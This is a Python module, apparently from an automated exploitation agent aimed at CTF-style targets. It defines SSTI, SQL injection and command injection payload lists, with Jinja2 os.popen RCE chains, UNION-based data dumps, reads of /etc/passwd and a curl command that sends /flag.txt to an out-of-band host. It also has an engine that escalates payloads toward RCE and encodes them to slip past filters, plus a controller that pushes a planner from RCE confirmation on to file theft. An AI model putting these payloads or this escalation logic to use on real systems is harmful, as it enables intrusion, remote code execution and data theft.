from __future__ import annotations

import re
from typing import Any

from memory.exploit_trajectory import ExploitTrajectoryMemory, VALID_STATES, get_trajectory
from memory.verification_memory import VerificationMemory, get_verification


# ── SSTI payload mutations ──
_SSTI_MUTATIONS = [
    "{{7*7}}",           # jinja2 basic
    "${7*7}",            # freemarker
    "#{7*7}",            # thymeleaf
    "<%= 7*7 %>",        # ERB
    "{{config}}",        # jinja2 config object
    "{{self}}",          # jinja2 self
    "{{''.__class__}}",  # jinja2 class access
    "{{''.__class__.__mro__}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    "{{lipsum.__globals__['os'].popen('id').read()}}",
    "{{joiner.__init__.__globals__.os.popen('id').read()}}",
]

# ── SQLi payload mutations ──
_SQLI_MUTATIONS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    '" OR "1"="1',
    "admin' --",
    "admin' #",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT table_name FROM information_schema.tables--",
    "' UNION SELECT @@version--",
]

# ── Command injection mutations ──
_CMDI_MUTATIONS = [
    ";id",
    ";whoami",
    "|id",
    "|whoami",
    "$(id)",
    "$(whoami)",
    "`id`",
    "`whoami`",
    "||id",
    "&&id",
    "|cat /etc/passwd",
    "$(cat /etc/passwd)",
    "%0aid",
    "%0awhoami",
    "\\nid",
    "; curl oob_url -d @/flag.txt",
]


class PayloadEvolutionEngine:
    """基于成功/失败历史的 payload 渐进变异引擎。

    设计原则：
      - 成功 payload 沿结构梯度变异（保留结构，升级执行原语）
      - 失败 payload 沿语法格式变异（保留语义，换格式/编码/分隔符）
      - 禁止随机替换：每次 mutation 必须有历史依据
    """

    _PRIMITIVE_MUTATION_MAP: dict[str, list[str]] = {
        "ssti": _SSTI_MUTATIONS,
        "sqli": _SQLI_MUTATIONS,
        "command_injection": _CMDI_MUTATIONS,
    }

    # ── 结构化关键字（保留）vs 执行原语（可替换）─
    _STRUCTURE_PATTERNS = [
        (r"\{\{.*\}\}", "ssti"),           # jinja2 braces
        (r"\$\{.*\}", "ssti"),             # freemarker
        (r"#\{.*\}", "ssti"),             # thymeleaf
        (r"' OR '1'='1", "sqli"),          # SQLi apostrophe
        (r'" OR "1"="1', "sqli"),          # SQLi quote
        (r";\s*\w+", "cmdi"),              # cmd separator + command
        (r"\$\s*\([\w\s]+\)", "cmdi"),     # sub-shell
    ]

    def __init__(
        self,
        trajectory: ExploitTrajectoryMemory | None = None,
        verification: VerificationMemory | None = None,
    ) -> None:
        self.trajectory = trajectory or get_trajectory()
        self.verification = verification or get_verification()

    # ────────────────────────────────────────────────────────
    #  public API
    # ────────────────────────────────────────────────────────

    def mutate_from_success(self, current_payload: str, primitive: str) -> str:
        """基于成功 payload 沿 exploit 原语梯度变异（升级执行层级）。

        例如 SSTI: {{7*7}} → {{config}} → {{self.__init__...}} → RCE
        """
        mutations = self._PRIMITIVE_MUTATION_MAP.get(primitive.lower(), [])
        if not mutations:
            return current_payload

        # 在 mutations 列表中找到当前 payload 的位置，返回下一个
        current_clean = current_payload.strip()
        for i, m in enumerate(mutations):
            if m.strip() == current_clean:
                if i + 1 < len(mutations):
                    return mutations[i + 1]
                return current_payload  # 已到链条末端

        # 当前 payload 不在预定义链条中 → 返回比它更进一级的
        idx_hint = len(mutations) // 2  # fallback to mid-chain
        for i, m in enumerate(mutations):
            if _payload_similarity(current_payload, m) > 0.6:
                idx_hint = min(i + 1, len(mutations) - 1)
                return mutations[idx_hint]

        return mutations[idx_hint]

    def mutate_from_failure(self, failed_payload: str, blocker: str = "") -> list[str]:
        """基于失败 payload 生成格式/编码/分隔符变异候选项。

        保留语义（攻击意图不变），变换语法格式。
        返回最多 5 个候选 payload。
        """
        candidates: list[str] = []

        # 检测 payload 类型
        primitive = _detect_primitive(failed_payload)

        # 策略 1：同原语不同格式
        for pat, cat in self._STRUCTURE_PATTERNS:
            if cat == primitive or not primitive:
                # 生成跨格式变异
                candidates.extend(_format_swap(failed_payload, primitive or "ssti"))

        # 策略 2：从 blacklist 中取补集
        blacklist = self.verification.facts.get("payload_blacklist", [])
        mutation_pool = self._PRIMITIVE_MUTATION_MAP.get(primitive, []) if primitive else []
        for m in mutation_pool:
            if m.strip() == failed_payload.strip():
                continue
            if any(bl.lower() in m.lower() for bl in blacklist):
                continue
            if m not in candidates:
                candidates.append(m)

        # 策略 3：编码/转义变异
        candidates.extend(_encoding_mutations(failed_payload))

        # 去重 + 限制
        unique: list[str] = []
        seen = set()
        for c in candidates:
            if c.strip() not in seen:
                seen.add(c.strip())
                unique.append(c)
                if len(unique) >= 5:
                    break
        return unique

    def preserve_working_structure(self, payload: str, new_primitive: str) -> str:
        """保留已确认可达的结构外壳，只替换内部的执行原语。"""
        # 提取结构特征
        structure = _extract_structure_category(payload)
        if structure == "jinja2_braces":
            # 保留 {{ ... }} 框架，替换内部
            inner = re.search(r"\{\{(.+?)\}\}", payload)
            if inner:
                new_inner = self._get_upgraded_primitive(new_primitive)
                return f"{{{{{new_inner}}}}}"
        elif structure == "freemarker_dollar":
            inner = re.search(r"\$\{(.+?)\}", payload)
            if inner:
                new_inner = self._get_upgraded_primitive(new_primitive)
                return f"${{{new_inner}}}"
        elif structure == "apostrophe_sqli":
            # 保留 ' OR 结构
            return f"' UNION SELECT @@version--"
        elif structure == "quote_sqli":
            return f'" UNION SELECT @@version--'
        return payload

    def _get_upgraded_primitive(self, primitive: str) -> str:
        """返回该原语类型的最高级 payload（RCE 级别）。"""
        if "ssti" in primitive.lower():
            return "lipsum.__globals__['os'].popen('id').read()"
        if "sqli" in primitive.lower():
            return "UNION SELECT table_name FROM information_schema.tables"
        if "cmd" in primitive.lower():
            return "curl oob_url -d @/flag.txt"
        return primitive


class AntiRegressionController:
    """防止 exploit 退化到已证伪路径的硬约束控制器。

    Validator 和 Planner 在每轮都必须通过这些检查。
    """

    def __init__(
        self,
        trajectory: ExploitTrajectoryMemory | None = None,
        verification: VerificationMemory | None = None,
    ) -> None:
        self.trajectory = trajectory or get_trajectory()
        self.verification = verification or get_verification()

    # ────────────────────────────────────────────────────────
    #  public validation API (used by Validator)
    # ────────────────────────────────────────────────────────

    def validate_state_regression(self, planned_steps: list[dict[str, Any]]) -> tuple[bool, str]:
        """禁止状态倒退。已处于 payload_injected 时不得重新做 endpoint fuzzing。
        已处于 gadget_triggered 时不得重复执行 RCE 确认命令（id/whoami），
        必须推进到 file_read（cat /flag* 等）。"""
        current_state = self.trajectory.get_current_state()
        state_order = {s: i for i, s in enumerate(VALID_STATES)}
        current_idx = state_order.get(current_state, 0)

        for step in planned_steps:
            purpose = (step.get("purpose") or "").lower()
            command = (step.get("command") or "").lower()

            # 检查是否在重新探测已经确认的端点
            if current_idx >= state_order.get("payload_injected", 2):
                # 用 \b 词边界防止误杀：Scanner 类名不应匹配 "scan"，（扫描）不应匹配 "discover"
                _single_word_signals = ["fuzz", "scan", "discover"]
                _multi_word_signals = ["enumerate endpoint", "find injection point", "探测端点", "发现注入点"]
                combined = " ".join([purpose, command])
                hit = any(re.search(rf"\b{s}\b", combined) for s in _single_word_signals) or \
                      any(s in combined for s in _multi_word_signals)
                if hit:
                    return False, (
                        f"状态退化禁止：当前 exploit 已处于 '{current_state}'，"
                        f"禁止重新执行端点 fuzzing/discovery。"
                        f"step_{step.get('id')} 的 purpose/command 包含回归信号。"
                    )

            # 检查是否在 gadget_triggered 之后重复 RCE 确认命令
            if current_idx >= state_order.get("gadget_triggered", 3):
                rce_only_signals = [
                    "exec(\"id\")", "exec('id')", "exec(\"whoami\")", "exec('whoami')",
                    "exec(\"ls", "exec('ls", "exec(\"hostname\")", "exec('hostname')",
                    "exec(\"uname", "exec('uname",
                ]
                if any(sig in command for sig in rce_only_signals):
                    return False, (
                        f"状态退化禁止：当前 exploit 已处于 '{current_state}'（RCE 已确认），"
                        f"禁止重复执行 RCE 确认命令（id/whoami/ls）。"
                        f"下一步必须推进到 file_read：将 cat /flag* 或 type C:\\flag* "
                        f"的执行结果回显到 HTTP 响应中。"
                    )

            # 检查是否在使用已拒绝的字段名
            rejected = self.verification.facts.get("rejected_fields", [])
            for field in rejected:
                if field and field.lower() in command.lower():
                    return False, (
                        f"Payload 退化禁止：字段 '{field}' 已被证伪（之前被目标拒绝），"
                        f"step_{step.get('id')} 中仍在使用。"
                    )

        return True, ""

    def validate_payload_regression(self, payload: str) -> tuple[bool, str]:
        """禁止重复已失败 payload、已拒绝字段、已知无效端点。"""
        failed = self.trajectory.get_failed_patterns()

        # 检查是否与已知失败 payload 高度相似
        for fp in failed.get("failed_payloads", []):
            if _payload_similarity(payload, fp) > 0.8:
                return False, f"Payload '{payload[:80]}' 与已失败 payload '{fp[:80]}' 高度相似（相似度 > 0.8），禁止重复。"

        # 检查 payload 黑名单
        if self.verification.is_payload_blacklisted(payload):
            return False, f"Payload 包含已确认的黑名单关键词。"

        return True, ""

    def validate_chain_break(self, planned_steps: list[dict[str, Any]], current_chain: list[str]) -> tuple[bool, str]:
        """禁止中断已有 exploit chain。

        如果已验证 /search endpoint 可注入，新 plan 的 step 1 必须是 /search，
        不能跳到完全不相关的端点重新探测。
        """
        injectable_eps = self.verification.facts.get("injectable_endpoints", [])
        if not injectable_eps:
            return True, ""  # 还没有确认的注入点，允许探测

        if not planned_steps:
            return True, ""

        # 第一个攻击步骤应该从已确认注入点出发
        first_step = planned_steps[0]
        first_command = (first_step.get("command") or "")

        any_ep_found = False
        for ep in injectable_eps:
            if ep in first_command:
                any_ep_found = True
                break

        # 如果第一步是 python 脚本，检查是否使用了已确认端点
        if first_step.get("type") == "python" and not any_ep_found:
            # 允许第一步做认证/登录，然后后续步骤使用已确认端点
            subsequent_uses = False
            for s in planned_steps[1:]:
                for ep in injectable_eps:
                    if ep in (s.get("command") or ""):
                        subsequent_uses = True
                        break
                if subsequent_uses:
                    break
            if not subsequent_uses:
                return False, (
                    f"Chain 完整性违规：已确认可注入端点 {injectable_eps}，"
                    f"但新 plan 未在任何步骤中使用这些端点。必须延续已有 exploit chain。"
                )

        return True, ""

    def validate_exploit_reasoning(self, steps: list[dict[str, Any]], current_state: str) -> tuple[bool, list[str]]:
        """验证每个步骤是否提供了状态推进理由。

        返回 (是否全通过, 错误列表)。
        """
        errors: list[str] = []
        state_order = {s: i for i, s in enumerate(VALID_STATES)}
        current_idx = state_order.get(current_state, 0)

        for step in steps:
            sid = step.get("id", "?")

            # 检查 why_this_step_advances_state
            why = step.get("why_this_step_advances_state", "")
            if not why or why.strip() == "":
                errors.append(
                    f"step_{sid}: 缺少 'why_this_step_advances_state' 字段，"
                    f"必须解释此步骤如何推动状态从 '{current_state}' 向前推进。"
                )

            # 检查 why_this_payload_is_a_mutation
            mutation_reason = step.get("why_this_payload_is_a_mutation", "")
            if not mutation_reason or mutation_reason.strip() == "":
                errors.append(
                    f"step_{sid}: 缺少 'why_this_payload_is_a_mutation' 字段，"
                    f"必须解释此 payload 与历史 payload 的关系（变异路径）。"
                )

            # 检查 why_this_is_not_regression
            anti_reg = step.get("why_this_is_not_regression", "")
            if not anti_reg or anti_reg.strip() == "":
                errors.append(
                    f"step_{sid}: 缺少 'why_this_is_not_regression' 字段，"
                    f"必须证明此步骤不会导致状态退化。"
                )

        return len(errors) == 0, errors


# ────────────────────────────────────────────────────────────────
#  helpers
# ────────────────────────────────────────────────────────────────

def _detect_primitive(payload: str) -> str:
    """从 payload 文本推断利用原语类型。"""
    p = payload.lower()
    if any(kw in p for kw in ("{{", "{%", "${", "#{", "<%=", "config", "self.__", "cycler", "lipsum", "joiner")):
        return "ssti"
    if any(kw in p for kw in ("select", "union", "' or ", '" or ', "drop table", "--", "information_schema")):
        return "sqli"
    if any(kw in p for kw in (";id", ";whoami", "|id", "|whoami", "$(id)", "`id`", "&&id", "||id", "curl", "wget")):
        return "command_injection"
    return ""


def _format_swap(payload: str, primitive: str) -> list[str]:
    """一次 payload 的跨格式变异：同样的语义，换不同的模板语法。"""
    swaps = []
    if primitive == "ssti":
        inner = re.sub(r"\{\{|}}|#\{|\$\{|\}\}", "", payload).strip()
        if inner:
            swaps.extend([f"{{{{{inner}}}}}", f"${{{inner}}}", f"#{{{inner}}}", f"<%={inner}%>"])
    return swaps


def _encoding_mutations(payload: str) -> list[str]:
    """编码/转义变异候选项。"""
    mutations = []
    # URL encode < > { }
    mutations.append(payload.replace("{", "%7B").replace("}", "%7D"))
    mutations.append(payload.replace("<", "&lt;").replace(">", "&gt;"))
    # Double encoding
    mutations.append(payload.replace("{", "%257B").replace("}", "%257D"))
    # Unicode escape
    mutations.append(payload.replace("{{", "\\u007b\\u007b").replace("}}", "\\u007d\\u007d"))
    return mutations


def _extract_structure_category(payload: str) -> str:
    """提取 payload 的结构类别。"""
    if "{{" in payload and "}}" in payload:
        return "jinja2_braces"
    if "${" in payload and "}" in payload:
        return "freemarker_dollar"
    if "#{" in payload and "}" in payload:
        return "thymeleaf_hash"
    if "' OR " in payload.upper() or "' UNION " in payload.upper():
        return "apostrophe_sqli"
    if '" OR ' in payload.upper() or '" UNION ' in payload.upper():
        return "quote_sqli"
    if re.search(r"[;&|$`]", payload):
        return "shell_separator"
    return "unknown"


def _payload_similarity(a: str, b: str) -> float:
    """简单的 Jaccard 相似度（基于字符 trigram）。"""
    def trigrams(s: str) -> set[str]:
        s = s.lower().strip()
        return {s[i:i+3] for i in range(max(0, len(s)-2))}
    ta, tb = trigrams(a), trigrams(b)
    if not ta or not tb:
        return 0.0
    return len(ta & tb) / len(ta | tb)